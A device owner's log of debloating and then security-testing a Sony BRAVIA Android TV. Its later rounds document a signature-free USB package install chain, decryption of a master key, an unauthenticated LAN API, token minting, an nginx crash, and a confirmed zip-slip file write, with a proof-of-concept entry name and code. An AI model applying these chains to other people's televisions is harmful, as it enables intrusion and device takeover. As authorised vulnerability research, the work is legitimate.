# Sony BRAVIA XBR-55X800H — Cleanup & Security Report

| | |
|---|---|
| **Device** | Sony BRAVIA 4K UR3, XBR-55X800H (MT5893, armv8l) |
| **OS** | Android 10, build `QTG3.200305.006.S97` / 662301 (= v6.6230-era, SPL 2026-02-01, kernel 4.19.75 built 2026-04-08) |
| **Boot state** | bootloader locked, verified boot **green**, dm-verity enforcing (read-only, non-rooted) |
| **Access** | network ADB `10.0.0.178:5555` (enabled; see [Operations](#operations)) |
| **Sessions** | R1–R2: 2026-07-23 · R3–R9: 2026-11-10/13 |
| **Companion docs** | [KERNEL_TRIAGE.md](KERNEL_TRIAGE.md) · local `~/sony-xrb-55x800h-analysis/` (HUNT.md, cached artifacts) |

---

## TL;DR — what was done

| Round | Date | Change | Reversibility |
|---|---|---|---|
| 1 | 2026-07-23 | 9 spyware/adware/telemetry packages removed (Samba ACR, promos, demo, bug-reporters) | `restore.sh --round1` |
| 2 | 2026-07-23 | 12 packages disabled (voice stack, recommendations, Cast/DLNA/Vewd/Games) + animations off; ⚠️ Vewd disable later caused a crash loop — see R3 | `restore.sh --round2` |
| 3 | 2026-11-10 | Sony launcher skin removed → **stock Android TV home** (customizer + RRO + Sony SELECT + tvx + homekit disabled) | `restore.sh --round3` |
| 4 | 2026-11-10 | 33 bloat/telemetry/hotel-mode packages disabled | `restore.sh --round4` |
| 5 | 2026-11-13 | **Paramount+ spinner root-caused** (AdGuard DNS vs Conviva); Private DNS left **off** | `private_dns_mode hostname` |
| 6 | 2026-11-13 | **Total microphone lockdown** (grants revoked + AppOps deny on all 204 packages) | see [Mic](#microphone-lockdown) |
| 7–9 | 2026-11-13 | Root hunt: attack-surface audit, artifact cache (2.1GB, local-only), kernel CVE triage | read-only |

Net: **55 packages disabled/removed**, stock launcher, mic sealed, telemetry minimized,
inputs/streaming/settings fully verified working by the operator after every destructive
round. Everything is reversible; nothing was rooted or flashed.

---

## Current device state

### Launcher & home
- HOME = `com.google.android.tvlauncher` (stock, unskinned). Sony's skin
  (`tvlaunchercustomizer` + RRO `overlay.apporder` + `sonyselect`) disabled.
- Launcher data cleared once (round 3) to drop stale Sony "Shop"/"Apps" tiles.

### Packages (55 disabled/removed for user 0)
- **Round 1 — removed** (`pm uninstall --user 0`, APK kept): Samba TV ACR (`tv.samba.ssm`),
  promos, demosupport/demosystemsupport, multiscreendemo, sonybugreportsys,
  bugreportsender, feedback, sonyloglevelsettingsys.
- **Round 2 — disabled**: tv.assistant, assistantadapter, voicerecognitionconfirmation,
  katniss, tvrecommendations, mediashell (Cast), sonyericsson.dlna + huey.dlna.*,
  play.games, videos. *(vewd re-enabled in round 3 — see below.)*
- **Round 3 — disabled**: tvlaunchercustomizer, tvlaunchercustomizer.overlay.apporder,
  sonyselect, tvx, homekit.
- **Round 4 — disabled**: customersupport(+provider), eulaviewer, helpguidecontents,
  smarthelp, privacypolicy, softwarelicense, bivlinfo, livingfit, notificationcenter,
  usercontext, seeds.iot(+remotestart), all 10 remaining `b2b.*`, networkapp.wifidirect,
  homenetwork, webapi.core, interactivetvutil(+output), seconddispsetting, hddmgr,
  quicksetup(+customizer), tvpositionscreen.
- **Round 6 — disabled**: acousticautocalibration (last Sony mic consumer).
- **Kept deliberately**: all `tvinput.*`, `tvapi`, `frame`, `braviasync*` (HDMI-CEC),
  `connecteddevicesettings`, `networksettings`, `imeproxy`, `audiooutput`,
  `HomeTheatreControl`, `smartmediaapp`, `seeds.auth`, `sonysystemservice`,
  `settingsprovider`, `modelvariation`, `configsettings`, `irb*`, `remotecontrolsettings`,
  `timers`, `servicemode`.
- **Firmware self-heal caveat**: `airplayapp`/`homekit` re-install themselves at boot and
  their persistent processes ignore disabled/uninstalled state (see
  [The AirPlay crash loop](#the-airplay-crash-loop)). They are inert post-fix.

### DNS (ad/tracker blocking)
- Round 1 set AdGuard DoT (`dns.adguard-dns.com`). Round 5 **disabled it**: AdGuard
  sinkholes `conviva.com`, which Paramount+ requires before starting playback.
- Current: `private_dns_mode=off` (specifier preserved).
- Restore blocking: `settings put global private_dns_mode hostname` — but Paramount+
  breaks again unless a personal AdGuard/NextDNS server with `@@||conviva.com^` is used.
- Long-term plan: LAN AdGuard Home + static DNS on the TV once self-hosted.

### Microphone lockdown
- All `RECORD_AUDIO` grants revoked (Gboard's active-IME grant is system-policy-fixed —
  covered by AppOps instead).
- `appops set <pkg> RECORD_AUDIO deny` applied to **all 204 packages** (enforcement
  layer; fails closed against any future grant).
- Hardware: no far-field mic in the TV (`androidboot.svp.builtinmic=0`, no audio input
  device registered); remote mic is push-to-talk into the disabled voice stack.
- Reversal: `appops reset` + targeted `pm grant` + `pm enable acousticautocalibration`.
  Details: `backups/mic-lockdown-20261113.txt`.

### ADB
- Enabled on 5555 for iteration. Harden when done:
  `adb shell settings put global adb_enabled 0`.

---

## The AirPlay crash loop

Why round 2's Vewd disable silently degraded the TV for four months, and why Vewd must
stay enabled:

1. Round 2 disabled `com.vewd.core.service`.
2. `com.sony.dtv.airplayapp` (`FLAG_PERSISTENT`) binds Vewd's `BrowserServiceImpl` in
   `Application.onCreate` → instant FATAL on every start.
3. `com.sony.dtv.homekit` shares UID 10085 + process with airplayapp and its
   BootCompletedReceiver starts the shared process at boot.
4. This firmware's persistent-restart path ignores BOTH `disabled-user` state and
   per-user uninstall; boot self-heal re-installs per-user uninstalls (verified with
   fresh `ceDataInode`s, with and without `-k`).
5. Result: ~10 crashes/sec since July (954+ buffer entries, load average 30+).

**Fix:** `pm enable com.vewd.core.service` (the only adb-reachable lever) — airplayapp
now idles resident (~80 MB) instead of burning a core. Do **not** re-disable Vewd.

---

## Paramount+ / AdGuard conflict (round 5)

- Symptom: app UI loads, every video = infinite spinner, **zero logged errors**
  (only GC churn + analytics-only connections: Adobe, Conviva, GMS, Fastly — no CDN, no
  Widevine license server).
- Cause: AdGuard sinkholes `conviva.com`/`livepass.conviva.com`; Paramount+ (v17.4.0)
  gates stream start on Conviva init. Verified by A/B and by AdGuard's own DoH resolver.
- Status: DNS blocking off on this TV (operator decision). Personal-server allowlist or
  LAN AdGuard Home with the `conviva.com` exception are the clean long-term fixes.

---

## Architecture & security findings

### Launcher architecture
`com.sony.dtv.tvx` is **not** the home app (no HOME intent filter). The Sony look is
`tvlaunchercustomizer` + RRO overlay + `sonyselect` on top of the stock
`com.google.android.tvlauncher`. Live TV/inputs live in separate `tvinput.*` packages.

### Dual-OS boundary
The TV runs a second OS (Sony's TV-OS) beside Android. Its mounts appear in Android's
namespace — `/mnt/vendor/linux_rootfs`, `/mnt/vendor/3rd`, `/vendor/recipe` (fmask=0000),
`/perm`, `/fdata` (rw), `/data/vendor/3rd_rw`, `/data/vendor/persist` — **all SELinux-denied
to the shell domain** (verified per-path). The shared staging ground is
`LINUX_TMP_PATH=/data/vendor/tmp` (root chmod 777 at boot by `dtv-svc`, hosts the
`DTVService`/`dtv_svc_application_ipc`/`DFBInput` sockets) — blocked to shell by SELinux
type, not DAC.

### Privilege surface (audited rounds 7–9)
- 38 packages run as uid 1000. Manifest audit of system-uid apps found 35 exported
  components **without manifest permission guards** — but the top lead (OTA bridge
  `UpdateSessionManagerService.offerPayload`) is **callergated in code**:
  `SignatureVerifier.hasValidSignature()` against four pinned Sony OTA-signer SHA-256s.
  Even direct `IUpdateEngine` bind requires a Sony-signed payload.
- `adb bugreport` works and returns a **root-collected dumpstate** (18.7MB cached:
  kernel cmdline with the full partition/encryption map, kernel log, iptables, EBPF
  stats, PRINTENV, SMAPS of all processes). `dumpstate` binary itself is exec-blocked
  for shell; the binder path is the door.
- **Trusty TEE + RPMB** (storageproxyd ↔ `/dev/trusty-ipc-dev0`); `trusty_version`
  denied even to root dumpstate. **Root nginx** ("reverseproxy") starts on property
  `vendor.svp.reverseproxy.enable=1`.
- **No setuid/setgid binaries** anywhere; SELinux Enforcing; kernel 4.19.75 armv8l
  (32-bit userland); no userfaultfd/SysVIPC/FUSE/AF_ALG/RxRPC/pedit → the 2026
  COW-class LPE wave and classic race primitives are unreachable. Details:
  [KERNEL_TRIAGE.md](KERNEL_TRIAGE.md).

### Root status
No public root for US-retail XBR-55X800H (locked bootloader, no unlock program; only
Chinese-market X8500G-era units have documented fastboot unlocks). `adb root` refused
(production build), no su binary, hosts file on read-only verity partitions. Practical
root paths, if ever pursued: custom-driver RE (`dtv_driver.ko` 13.6MB, `sony_pqctrl`),
Mali r21p0 advisory cross-reference, or post-SPL 4.19 regressions — see
[KERNEL_TRIAGE.md](KERNEL_TRIAGE.md).

### Secrets hygiene (verified)
Static sweep of 115 cached APKs: no credentials. Sony build-redacts private keys with
literal `[REDACTED PRIVATE KEY]` placeholders (IddAgent, OtaUrlProvisioning).

---

## Operations

```bash
ADB=~/google-glasses/tools/platform-tools/adb   # macOS universal (repo copy is linux-x86_64)
DEV=10.0.0.178:5555

$ADB connect $DEV                 # stale-server pitfall: kill-server first if
                                  # connect fails EHOSTUNREACH while ping/nc work
$ADB -s $DEV shell <cmd>          # uid 2000 shell — all admin below uses this
```

| Task | Command |
|---|---|
| Revert round 1 | `./backups/restore.sh --round1` |
| Revert round 2 (vewd stays enabled) | `./backups/restore.sh --round2` |
| Revert round 3 | `./backups/restore.sh --round3` |
| Revert round 4 | `./backups/restore.sh --round4` |
| Restore ad-blocking (breaks Paramount+) | `adb shell settings put global private_dns_mode hostname` |
| Undo mic lockdown | `adb shell appops reset` + targeted `pm grant` + `pm enable acousticautocalibration` |
| Disable ADB when done | `adb shell settings put global adb_enabled 0` |
| Factory reset | restores everything Sony (and re-runs setup wizard) |

**After any future OTA (v6.7+):** re-run rounds 1/3/4 disable lists, re-verify the
crash-loop fix holds, re-check ADB. Package-state snapshots live in `backups/`.

---

## Round log (details)

### Round 1 (2026-07-23) — spyware/adware removal
Removed per-user (APK retained, restorable via `pm install-existing`): Samba TV ACR
(`tv.samba.ssm` — fingerprints viewing), promos, demosupport/demosystemsupport,
multiscreendemo, sonybugreportsys, bugreportsender, feedback, sonyloglevelsettingsys.
213 → 204 installed packages; core packages verified intact. AdGuard DoT configured
and verified (doubleclick → 127.0.0.1). Snapshot: `backups/snapshot-20260723-160017/`.

### Round 2 (2026-07-23) — voice + perf tuning
Disabled: voice stack (tv.assistant, assistantadapter, voicerecognitionconfirmation),
recommendations (katniss, tvrecommendations), unused background services (mediashell,
DLNA trio, vewd, play.games, videos). Animations → 0. Ads personalization opted out
on-device. ⚠️ The Vewd disable here seeded the AirPlay crash loop (fixed round 3).

### Round 3 (2026-11-10) — stock launcher
Disabled tvlaunchercustomizer + overlay.apporder + sonyselect + tvx + homekit;
`pm clear com.google.android.tvlauncher` to drop stale Shop/Apps tiles (account picker
appears once after clear). Verified: stock home, HDMI switching, Netflix/YouTube,
Settings — all ✓. Crash loop fixed (vewd re-enable) with 0 new crashes after.

### Round 4 (2026-11-10) — bloat/telemetry pass
33 packages disabled (full list preserved in git history and `backups/`): support/help/
promo apps, all remaining `b2b.*` hotel-mode packages, `seeds.iot*`, `webapi.core`,
`homenetwork`, `wifidirect`, `interactivetvutil*`, `seconddispsetting`, `hddmgr`,
`quicksetup*`. Input-critical packages kept (list in round-4 commit).

### Round 5 (2026-11-13) — Paramount+ spinner
Root-caused and resolved as described above ([TL;DR](#tldr--what-was-done),
[Paramount+ section](#paramount--adguard-conflict-round-5)).

### Round 6 (2026-11-13) — microphone lockdown
As described in [Microphone lockdown](#microphone-lockdown). Pre-state: 6 apps held the
grant; last actual mic use was YouTube ~245 days prior (557 ms).

### Round 7 (2026-11-13) — privesc attack-surface audit
Read-only root hunt. 38 system-uid packages; 11 audited via manifest parse → 35 exported
components without manifest guards; OTA bridge lead killed by in-code signature gating
(four pinned certs extracted); TV-OS sockets/mounts confirmed blocked; verdict: no
trivial root. Artifacts kept out of the repo (Sony code) in the local analysis dir.

### Round 8 (2026-11-13) — artifact cache + kernel evidence
2.1GB local cache built (`~/sony-xrb-55x800h-analysis/`, sha256 manifest): 115 APKs,
18 kernel modules + root `.ko`s, 66 init .rc files, partial /vendor/bin (root HAL
daemons are SELinux-uncachable), full kernel config + lsmod + getprop + sysctls.
`.gitignore` hardened. Firmware understanding corrected (see [meta](#tldr--what-was-done)
table — build is v6.6230-era, not 2020).

### Round 9 (2026-11-13) — artifact exploitation hunt
Full campaign log: `~/sony-xrb-55x800h-analysis/HUNT.md`. Highlights: the
confused-deputy door into OwnerService (audited — action-dispatched modules, no
attacker-controlled sinks at grep depth); `adb bugreport` root data stream; Trusty TEE,
root nginx, keydldaemon mapped; static secret hunt clean; usbmsgservice fake-USB chain
mapped end-to-end and closed.

---

## Repository layout

```
CLEANUP_REPORT.md      this document
KERNEL_TRIAGE.md       kernel CVE triage baseline (round 8)
backups/
  restore.sh           revert script (--round1..4, --dns-only; vewd-safe)
  snapshot-*/          pre-change package/prop snapshots
  mic-lockdown-*.txt   mic lockdown record + reversal
  round2-prestate.txt
.gitignore             keeps device artifacts out of git (*.apk/*.ko/*.dex/…)
platform-tools/        linux-x86_64 adb bundled by round 1 (macOS users: use
                       ~/google-glasses/tools/platform-tools/adb instead)
```

Local-only (never committed): `~/sony-xrb-55x800h-analysis/` — 2.1GB artifact cache
(APKs, modules, init rcs, kernel evidence, bugreport), `HUNT.md` campaign log,
decompiled trees, audit tooling. See its `README.md`.

---

# Round 10 (2026-11-13): the USB BPK chain — full map, hardware test pending

**Operator offers physical USB access; "walk the usb path and reenable those services".**

## The chain (all verified in decompiled code, not yet on hardware)

1. USB volume with `extapp_installer.pkg` at root → MTK DeviceManager real mount →
   `usbmsgservice` (uid 1000) broadcasts `IsExistNodeInstallerFile=true` + mount path.
2. `com.sony.dtv.b2b.noderuntime.privilege` `UsbDetector` (uid 10033, system priv-app):
   the single-BPK branch **skips the pincode dialog and the hotel-mode autorun gate**
   (both apply only to the multi-package scan path).
3. `AppInstallerUtil.isBpkPkgFile()` = **8-byte magic check only**
   (`EAIP\x00\x00\x01\x00`) — no signature, no checksum, no certificate.
4. `NodeRuntimeService` installs + launches the BPK as uid 10033, which holds
   WRITE_SECURE_SETTINGS, MASTER_CLEAR, REBOOT, INTERACT_ACROSS_USERS_FULL,
   MANAGE_USERS, WRITE_MEDIA_STORAGE, REQUEST_INSTALL/DELETE_PACKAGES,
   CAPTURE_VIDEO_OUTPUT, KILL_BACKGROUND_PROCESSES — and ships JNA/javacpp/
   commons-compress for native reach.
5. BPK body = installer JSON with a literal `cmd` key, `installation`, `options`
   (forcereboot, avoid_interruption), `meta` — format reconstruction in progress.

Second chain on the same stick: `Bravia*HotelSettings.dat` → ImportExport (uid 1000,
system) → HotelSettings provider writes.

## Closed this round

- nginx reverseproxy: `setprop vendor.svp.reverseproxy.enable` is SELinux-denied to
  shell; nginx not running; 2026 CVE set (15176 alias+rewrite heap overflow et al.)
  dormant unless the reverseproxy is ever started by Sony features.

## Next (hardware phase)

1. Reconstruct exact BPK body format from `loadInstallerInfo*` + `NodeRuntimeService`.
2. `pm enable` the noderuntime packages (reversible).
3. Operator plugs in USB → stage BPK via adb onto the stick → observe install/launch
   in logcat → verify uid + capabilities of the running node app.
4. Rollback: `pm disable` again, remove USB files.

---

# Round 11 (2026-11-13): USB BPK chain — VERIFIED END-TO-END ON HARDWARE

Operator plugged in a USB stick; the full chain was exercised with Sony's own
`bravia-web-control-ui` BPK (extracted from the runtime APK's `assets/preinstall/`).

## What happened (log-verified)

1. Stick mounted (real MTK mount) → usbmsgservice broadcast `IsExistNodeInstallerFile=true`.
2. NodeRuntimePrivilege UsbDetector fired; single-BPK path bypassed pincode + hotel gates.
3. Three round-4-disabled dependencies had to be re-enabled as the chain demanded them
   (each logged its absence): `prosettings` (supplies the RSA key via
   `ProSettings.decryptPhrase`), `noderuntime.normal` (its PermissionActivity is the
   forward target — its absence crashed the consent dialog in onCreate), `webapi.core`
   (WebApiCoreService for platform tokens).
4. Consent UI: `extapp_basic_installer3` Vewd web app (WebAppRuntimeActivity, uid 10002)
   loaded, talking to the runtime's `AppInstallerBackendServer` on 127.0.0.1:20040/20041.
   Operator confirmed "sony bravia web control ui 1.1.8 is ready to install" → OK.
5. Install completed; `forcereboot` fired (TV rebooted itself).
6. After reboot: **bravia-web-control-ui auto-launched** via BootReceiver →
   `NodeProcessService0` (uid 10033) `execNodeAsSharedlib` of
   `/data/user/0/com.sony.dtv.b2b.noderuntime.privilege/app/node_services/bravia-web-control-ui/index.js`.
7. The platform started **nginx reverseproxy** (root → uid 2900) on **0.0.0.0:80**.

## Resulting LAN exposure (verified by probe)

- `POST /sony/avContent` (getCurrentExternalInputsStatus) → **200 with full input list,
  NO authentication**.
- `POST /sony/system` / `/sony/IRCC` → 403 + webauth flow (`auth_default` = LAN PIN,
  `auth_tv` = localhost-trusted token issuance on 127.0.0.1:80).
- Node stack internal listener 127.0.0.1:20338 (uid 10033).

## Security assessment

- **Chain proven**: physical USB + 8-byte magic (`EAIP\0\0\1\0`) → privileged node app
  (uid 10033: WRITE_SECURE_SETTINGS, MASTER_CLEAR, REBOOT, INTERACT_ACROSS_USERS_FULL,
  MANAGE_USERS, REQUEST_INSTALL_PACKAGES…) persistently auto-running at boot. The BPK
  body is RSA-wrapped (Sony key needed to craft NEW packages) but ANY existing
  legitimately-built BPK (hotel TVs, firmware dumps, the four in the runtime APK itself)
  replays onto any consumer set with operator consent only.
- **Current posture regression**: the web API surface (removed in round 4) is back and
  partially unauthenticated on the LAN; node platform runs at boot.

## Rollback (when desired)

- `pm disable` noderuntime.{privilege,normal,extension} + prosettings + webapi.core →
  node app stops, nginx goes away, API closes. BPK remains installed but inert.
- Full removal of the installed app: the runtime's uninstaller
  (`assets/autoUninstaller.pkg` — cached) or the install-record deletion flow.

---

# Round 12 (2026-11-13): docs restructure — keep decision + narrative

- Operator decision: **web-control stack stays** (nginx + Sony JSON-RPC API on :80,
  bravia-web-control-ui auto-running). Toggle: `scripts/webstack-toggle.sh`.
- Repository restructured: findings showcase → `docs/FINDINGS.md`; runbook →
  `docs/OPERATIONS.md`; full reproduction guide → `docs/REPRODUCE.md`; analysis
  tooling → `scripts/`; this round-by-round log → `docs/history/ROUNDS.md`
  (was CLEANUP_REPORT.md — superseded as front document, preserved verbatim).
- Current state (verified live): 49 packages disabled, 9 removed, mic lockdown,
  DNS blocking off, web stack running, ADB on 5555.

---

# Round 13 (2026-11-13): ProSettingsService — exported system admin API

Operator pivots to root. Removed CLEANUP_REPORT.md (fully superseded by docs/).

## Finding

`com.sony.dtv.b2b.prosettings/.ProSettingsService` (uid 1000) is **exported and
guarded only by `android.permission.WRITE_SECURE_SETTINGS`** — an adb-grantable
development permission. Full admin interface: decryptPhrase (BPK MasterKey path),
getConfiguredWifiNetworks, getIpControlPSK, installLogo/uninstallLogo, setHotelMode,
setFeatures, enable/disableAppPackage, clearAllAccount, firmware-write flows,
processRequestSync (JSON-RPC router — only service "system"/prepareFwWrite, dead
post-Treble). decryptPhrase executes the native `/system/bin/b2bcmd decrypt_phrase`
(shell-blocked binary) as uid 1000; the fallback packed pubkey in NodeRuntimePrivilege
was build-stripped (`PACKED_PUBKEY = new int[0]`).

## Probe (built + executed on hardware)

`scripts/prosettings-probe/` — 20.8KB APK (Glass toolchain recipe; Sony AIDL
interfaces extracted per-device, not redistributed). Results:
- bind OK from an adb-installed untrusted app (pm grant WRITE_SECURE_SETTINGS)
- wifi configs disclosed (SSIDs/WPA/MACs; PSKs masked by toString)
- IpControlPSK empty; deviceId `[redacted MAC]`; SW PKG6.6230.0725NAA
- decryptPhrase → {"success":false} (b2bcmd semantics unresolved)

## Web-control stack state

- `/sony/webui/` (Nuxt SPA served by the node app, Express on 127.0.0.1:20338,
  proxied via nginx :80) returns error?code=1 for all routes — app-internal
  error state (suspect: hotel-mode configuration prerequisite).
- `adb forward` = localhost client: auth_tv endpoint reachable, guide/
  getSupportedApiInfo gated, accessControl/act → error 12.

## Open leads

- installLogo(String): candidate file-write primitive as uid 1000
- b2bcmd decrypt_phrase semantics (why success:false; lock file at
  /vendor/tmp/odm/b2b/b2bcmd.lock)
- wifi PSK unmasking via other system-uid paths
- webui error state prerequisite (hotel mode?)

---

# Round 14 (2026-11-13): MasterKey extracted → full offline BPK decryption

## Chain

1. Root-log trick (logcat carries `B2BCMD` stderr): our first decryptPhrase failed
   with `decrypt_phrase_error: -5` — **a corrupted constant in our probe** (hand-copied
   pubkey blob differed from ground truth at byte 451). Fixed programmatically; no more
   hand-copying crypto material.
2. Rebuilt probe against platform-34 (android-34-ext11 jar + build-tools r34, both now
   in the analysis dir); targetSdk 29 (clears the "app is old" warning).
3. `decryptPhrase("MasterKey", ENCRYPTED_PUBKEY)` → success → **RSA-2048 master public
   key** (PEM, openssl-verified).
4. Wrote `scripts/bpk_decrypt.py` (stdlib + openssl CLI): parses the EAIP header,
   RSA-public-recovers the wrapped key (48 bytes = 32-byte AES key + 16-byte MD5),
   verifies the body MD5, AES-256-CBC zero-IV decrypts to TGZ.
5. **Decrypted `bravia-web-control-ui` 1.1.8+230** (7,532 files, 72MB): MD5 OK,
   valid gzip, full source extracted.

## Web-control UI internals (from decrypted source)

- `app.js`: every route sits behind `hasAdminPassword` + `digestPassport.auth` —
  **the error?code=1 state is "no admin password set"**. Set the B2B admin password
  and the UI un-gates (then HTTP DIGEST auth).
- Authenticated surface: `POST /sony/webui/api/ircc`, `ALL /api/firmwareupdate/:method/:id`,
  `ALL /api/import` (settings import, chunk-upload-storage), `ALL /api/export`,
  `POST /api/androidbridge/:service/:method` (**generic Android-side forwarding proxy**),
  GraphQL at `/api/graphql`, webapi + IRCC proxies.
- The androidbridge proxy → `webappservice` (uid 1000) — the web shell skeleton.

## Next

Set the admin password (B2B flow / ProSettingsService `setFeatures`), digest-auth to
the webui, then audit `/api/androidbridge` + `/api/import` for write primitives.

---

# Round 15 (2026-11-13): webui un-gated — full TV control API online

Operator set the B2B admin password via the on-screen PasswordActivity (temp:
`1234abcd`; **operator wants it removed once the campaign completes**).

## What unlocked

1. **Digest auth works**: `curl --digest -u admin:<pw> http://<tv>:<sony/webui>/*`
   → 200 on all routes. The webui Express app is fully accessible.
2. **`/api/androidbridge/:service/:method`** — the generic bridge proxy works.
   `system/getSystemInformation` returned the full device dossier:
   model, serial, panel, node version, IMportExport version, device ID.
3. **`system/generateWebApiAuthToken`** → `{"token":"CAC639DFBBFCC35142D81CE2D47E5D98AE141EA0"}`
   — a **webApiToken** minted on demand, no PIN, no rate limit observed.
4. **With the token**, the full Sony JSON-RPC API on port 80 responds:
   - `getSystemInformation` → full device info
   - `getPowerStatus` → active
   - `getApplicationList` → every installed app with launch URIs
   - `getRemoteControllerInfo` → every remote button code (IRCC codes)
   - **`/sony/ircc` (SOAP)** → sent a HOME button press — **200 OK**
     (the TV physically received a remote-control command via our HTTP call)

## Architecture (complete, verified)

```
nginx :80 (root, uid 2900)
  └─ /sony/webui/ → Express (uid 10033, node app)
       └─ digest auth (admin password, AndroidKeyStore TEE-backed)
            └─ /api/androidbridge/:service/:method
                 └─ bridge socket (privilege.sock, no auth of its own)
                      └─ Java platform classes (uid 10033)
                           ├─ system.*    → system info, token minting
                           ├─ settings.*  → import/export, pro mode
                           ├─ android.*   → package management
                           └─ mode.*      → pro/hotel mode switching
  └─ /sony/* (JSON-RPC + SOAP IRCC) ← x-application-token header
```

## Security assessment

- The webui password is stored TEE-encrypted (AndroidKeyStore AES-GCM).
- Once authenticated, `generateWebApiAuthToken` mints unlimited tokens.
- The IRCC endpoint accepts raw button codes (full remote-control from HTTP).
- The androidbridge proxy exposes service/method dispatch with no per-call
  authorization beyond the initial digest auth.

## Password removal (post-campaign)

- Clear via PasswordActivity on the TV (Settings → B2B → Admin Password → clear),
  or: `pm disable com.sony.dtv.b2b.adminpassword` (password persists in keystore
  but the auth service stops responding → webui returns to error?code=1).
- Full removal: factory reset the B2B admin password data via
  `pm clear com.sony.dtv.b2b.adminpassword`.

---

# Round 16 (2026-11-14): nginx DoS + bridge service mapping

## What happened
- Tested `system/setWebApiForwarding` with external + `file://` URIs.
- All accepted (`{"result":{}}`) — **but the `file://` rule killed nginx.**
- nginx cannot be restarted without a reboot:
  - `setprop vendor.svp.reverseproxy.enable 1` → SELinux-denied from shell
  - ProSettingsService `setSystemProperty()` → `UnsupportedOperationException:
    SystemPropertiesSet() is not supported on this OS` (firmware-gated)
  - `WebApiCoreService` requires `BIND_WEBAPI_CORE_SERVICE` (signature)
  - `pm disable` of webapi.core → blocked for shell (signature-protected package)

## Findings (Round 16)
1. **nginx DoS via setWebApiForwarding**: the webui's bridge method accepts
   arbitrary `file://` URIs in forwarding rules; the resulting nginx config
   kills the process. Unrecoverable without reboot. (CWE-20: improper input
   validation on a privileged bridge method.)
2. **setWebApiForwarding accepts external hosts** — potential SSRF/proxy
   primitive (accepted `http://10.0.0.14:9999/`). **UNVERIFIED**: a listener
   on 10.0.0.14:9999 received no connection — nginx died (from the file://
   rule submitted in the same batch) before it could reload the config.
   Retest post-reboot with ONLY the external-host rule (no file://).
3. **Bridge service map (verified live)**:
   - `system/getSystemInformation` — full device dossier
   - `system/hasAdminPassword` — gate check
   - `system/generateWebApiAuthToken` — token minting (unlimited)
   - `system/getIpControlAuthentication` — `{"auth":0,"psk":""}` (IP control off)
   - `system/setWebApiForwarding` — nginx forwarding rules (DANGEROUS)
   - `android/getAndroidPackages` — full package list
   - `settings/*` — **ALL CRASH the webui** (bind to importexport fails)
4. **Settings service crash root cause**: `settings/*` methods bind to
   `com.sony.dtv.b2b.importexport/RemoteImportExportService`. Even with
   importexport enabled, the bind crashes NodeProcessService0 with
   `FATAL EXCEPTION: Thread-2`.
5. **setSystemProperty on ProSettingsService**: implemented but throws
   `UnsupportedOperationException` on this firmware variant (B2B-gated).
   The method exists in the AIDL (TRANSACTION 25) but is firmware-disabled.

## Current state (after nginx DoS)
- **webui (port 20338): ALIVE** — accessible via adb forward tcp:18081
- **nginx (port 80): DEAD** — no native Sony API endpoint
- **Bridge services: WORKING** (system, android — via webui's proxy)
- **JSON-RPC proxy: WORKING** (via webui's /api/webapi/:path)
- **IRCC: WORKING** (via webui's /api/ircc)
- **GraphQL: NOT WORKING** (body-parser issue in the webui)
- **Admin password: `1234abcd`** (removal deferred)

## Recovery path
- Reboot the TV to restore nginx. All changes persist:
  - BPK-installed webui (permanent)
  - Admin password (keystore)
  - Node runtime (auto-start)
  - Debloat changes (pm disable persists)

---

# Round 17 (2026-11-14): ZIP-SLIP ARBITRARY FILE WRITE — CONFIRMED

## The vulnerability (CWE-22: Path Traversal)

**`ZipUtil.inflate()` in `com.sony.dtv.b2b.importexport` does not validate
individual zip ENTRY names.** Only the top-level zip path and output directory
are checked (`FileUtil.checkDirectoryTraversal()` checks `starts with /` and
`no ../ substring` on those two arguments only).

```java
// The vulnerable extraction loop:
ZipEntry entry = entries.nextElement();
File file3 = new File(outputDir, entry.getName());  // ← NO VALIDATION of entry.getName()
```

## Attack chain (verified end-to-end)

```
1. POST /sony/webui/api/import (digest auth: admin/<password>)
   └─ multer saves uploaded zip to .tmp/import.zip (uid 10033)
2. Bridge: settings.importFromFile({file: .tmp/import.zip})
   └─ RemoteImportExportService.importFile() (uid 1000)
3. ImportRemoteActivity starts on the TV screen
   └─ ZipUtil.inflate(zipPath, externalCacheDir + "/RemoteImportTemp")
4. EXTRACTION: new File(outputDir, "../../../../../ZIPSLIP_SD_CARD.txt")
   └─ Path traversal: 5x ../ escapes the extraction directory
   └─ WRITE: /storage/emulated/0/ZIPSLIP_SD_CARD.txt  ← CONFIRMED ON DEVICE
5. ImportService then validates the zip (FormatError = code 4)
   └─ But the write ALREADY HAPPENED (extraction precedes validation)
```

## Proof of concept

- **Entry name**: `../../../../../ZIPSLIP_SD_CARD.txt`
- **Result on device**: `-rw-rw---- 1 root sdcard_rw 70 /sdcard/ZIPSLIP_SD_CARD.txt`
- **Content verified**: "ZIP-SLIP CONFIRMED: written to shared storage root
  via path traversal"
- **Marker cleaned up** after verification.

## Path resolution boundaries (tested)

| Target | `../` count | Result |
|--------|------------|--------|
| `/sdcard/` (FUSE root) | 5 | **WRITE SUCCEEDED** |
| `/data/local/tmp/` | 9 | EACCES (root:shell 0771, uid 1000 not in group) |
| `/data/system/` | 9 | EACCES (SELinux: importexport domain cannot write system_data_file) |
| Above FUSE root | 6 | Failed (FUSE mount blocks upward writes) |
| Other app's data dir | 3 | Failed (Android 10 scoped storage) |

**Key insight**: The 9-level traversal DOES resolve through the FUSE mount to
the real filesystem (the EACCES error proves the path resolved — it's a
permission denial, not ENOENT). SELinux, not the path traversal, is the
remaining barrier to system-path writes.

## Root-log trick (documented)

The webui's node.js `console.log` output appears in logcat with tag `node.js`.
The importexport Java code logs with tags `ImportRemoteActivity`, `ZipUtil`,
`RemoteImportExportService`. This gives us full visibility into the import
chain without needing shell access to the app's private directories:

```
adb shell "logcat -d | grep -E 'node\.js|ZipUtil|ImportRemote'"
```

## Dependency audit (webui node_modules)

| Package | Version | Known CVEs |
|---------|---------|-----------|
| multer | 1.4.2 | EOL branch; busboy parsing issues |
| express | 4.17.1 | CVE-2024-29041, CVE-2024-43796 |
| body-parser | 1.19.0 | CVE-2024-45590 (DoS) |
| node-serialize | NOT PRESENT | — (no deserialization RCE) |

Node.js runtime: v20.11.1 (armeabi-v7a, 32-bit). Release-day CVEs patched in
that version; ~50 CVEs behind from the 2025-2026 cycle. No ExploitDB entries
for the runtime itself.

## Settings service crash root cause (SOLVED)

The `settings/*` bridge methods crashed because:
1. `HotelMode.getCurrentHotelMode()` reads
   `content://com.sony.dtv.b2b.hotelsettings/hotel` key `hotel_mode`
2. `com.sony.dtv.b2b.hotelmode` was disabled (our July debloat)
3. Provider returned null → `switch(null)` → NullPointerException
